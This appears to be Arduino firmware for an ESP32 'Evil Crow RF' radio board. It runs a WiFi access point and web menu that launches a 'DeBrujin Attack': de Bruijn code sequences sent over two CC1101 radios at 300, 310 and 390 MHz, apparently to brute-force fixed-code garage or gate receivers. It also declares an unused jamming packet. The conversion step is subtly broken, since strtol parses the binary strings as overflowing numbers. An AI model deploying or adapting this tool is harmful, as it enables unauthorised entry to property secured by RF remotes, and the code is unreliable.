#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>
#include "sites.h"

//AP Config
const char *ssid = "whiterose";
const char *pwd = "quieresplota?";

// HTML and CSS style
const String MENU = "<body><p>RED RF v1.0</p><div id=\"header\"><div id=\"menu\"><ul><a class=\"myButton\" href=\"/\">Menu</a><a class=\"myButton\" href=\"/debrujin\">DeBrujin Attack</a></ul></div></div></style>";
const String HTML_CSS_STYLING = "<html><head><meta charset=\"utf-8\"><title>Evil Crow RF</title><style>     body {     background-color: #333333;     font-family: \"Century Gothic\", Arial;     color: white;     margin: 20px;}.myButton:link, .myButton:visited {background: linear-gradient(#777777, #444444);color: white;padding: 4px;min-width: 100px;border-radius: 5px;border: 2px solid white;text-align: center;margin-right: 20px;text-decoration: none;display: inline-block;transition: 0.25s;}  .myButton:hover, .myButton:active {background: linear-gradient(#888888, #555555);border: 2px solid deepskyblue;border-radius: 10px;transform: scale(1.15);}</style></head>";

//Web Server
WebServer server(80);

//Hardware config for EvilCrowRF
//------------------------------
//CC1101 Pins
int sck = 18;
int miso = 19;
int mosi = 23;
int csn1 = 5;
int csn2 = 27;
int gdo0_1 = 2;
int gdo2_1 = 4;
int gdo0_2 = 25;
int gdo2_2 = 26;

//Pushbutton Pins
int push1 = 34;
int push2 = 35;
int push3 = 32;
//------------------------------

//Utils
String debruijn_ten = "0000000000100000000110000000101000000011100000010010000001011000000110100000011110000010001000001001100000101010000010111000001100100000110110000011101000001111100001000010001100001001010000100111000010100100001010110000101101000010111100001100010000110011000011010100001101110000111001000011101100001111010000111111000100010100010001110001001001000100101100010011010001001111000101001100010101010001010111000101100100010110110001011101000101111100011000110010100011001110001101001000110101100011011010001101111000111001100011101010001110111000111100100011110110001111101000111111100100100110010010101001001011100100110110010011101001001111100101001010011100101010110010101101001010111100101100110010110101001011011100101110110010111101001011111100110011010011001111001101010100110101110011011011001101110100110111110011100111010110011101101001110111100111101010011110111001111101100111111010011111111010101010111010101101101010111110101101011011110101110111010111101101011111110110110111011011111101110111110111101111111111000000000";
String debruijn_nine = "0000000001000000011000000101000000111000001001000001011000001101000001111000010001000010011000010101000010111000011001000011011000011101000011111000100011000100101000100111000101001000101011000101101000101111000110011000110101000110111000111001000111011000111101000111111001001001011001001101001001111001010011001010101001010111001011011001011101001011111001100111001101011001101101001101111001110101001110111001111011001111101001111111010101011010101111010110111010111011010111111011011011111011101111011111111100000000";
String debruijn_eight = "00000000100000011000001010000011100001001000010110000110100001111000100010011000101010001011100011001000110110001110100011111001001010010011100101011001011010010111100110011010100110111001110110011110100111111010101011101011011010111110110111101110111111110000000";
String jam_packet = "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111";

//Global vars
unsigned long code;
int pushbutton1 = 0;
int pushbutton2 = 0;
int pushbutton3 = 0;
RCSwitch CC1101_1 = RCSwitch();
RCSwitch CC1101_2 = RCSwitch();

void setup()
{
	Serial.begin(38400);
	delay(500);
	WiFi.mode(WIFI_AP);
	WiFi.softAP(ssid, pwd);
	pinMode(push1, INPUT);
	pinMode(push2, INPUT);
	pinMode(push3, INPUT);

	//Load Menu
	server.on("/", []()
	{
		server.send(200, "text/html", HTML_CSS_STYLING + MENU);
	});

	//Load DeBrujin Attack
	server.on("/debrujin", []()
	{
		server.send_P(200, "text/html", DeBrujin);
	});

	server.on("/dodbj", []()
	{
		rfsend1(300, debruijn_ten);
		rfsend2(300, debruijn_ten);
		rfsend1(310, debruijn_ten);
		rfsend2(310, debruijn_ten);
		rfsend1(390, debruijn_nine);
		rfsend2(390, debruijn_nine);
		rfsend1(310, debruijn_eight);
		rfsend2(310, debruijn_eight);
		server.send_P(200, "text/html", Success);
	});
 
	server.begin();
}

//Send signal by module 1
void rfsend1(int frequency, String mystr)
{
  code = strtol(mystr.c_str(),NULL,0);
  
	ELECHOUSE_cc1101.setSpiPin(sck, miso, mosi, csn1);
	ELECHOUSE_cc1101.setMHZ(frequency);
	ELECHOUSE_cc1101.Init();
	CC1101_1.enableTransmit(gdo0_1);
	ELECHOUSE_cc1101.SetTx();
	CC1101_1.send(code, 50);
	delay(1);
}

//Send signal by module 2
void rfsend2(int frequency, String mystr)
{
  code = strtol(mystr.c_str(),NULL,0);
  
	ELECHOUSE_cc1101.setSpiPin(sck, miso, mosi, csn2);
	ELECHOUSE_cc1101.setMHZ(frequency);
	ELECHOUSE_cc1101.Init();
	CC1101_2.enableTransmit(gdo0_2);
	ELECHOUSE_cc1101.SetTx();
	CC1101_2.send(code, 50);
}

void loop()
{
	server.handleClient();
	pushbutton1 = digitalRead(push1);
	pushbutton2 = digitalRead(push2);
	pushbutton3 = digitalRead(push3);

	if (pushbutton1 == LOW)
	{
		Serial.println("1");
	}

	if (pushbutton2 == LOW)
	{
		Serial.println("2");
	}

	if (pushbutton3 == LOW)
	{
		Serial.println("3");
	}
}
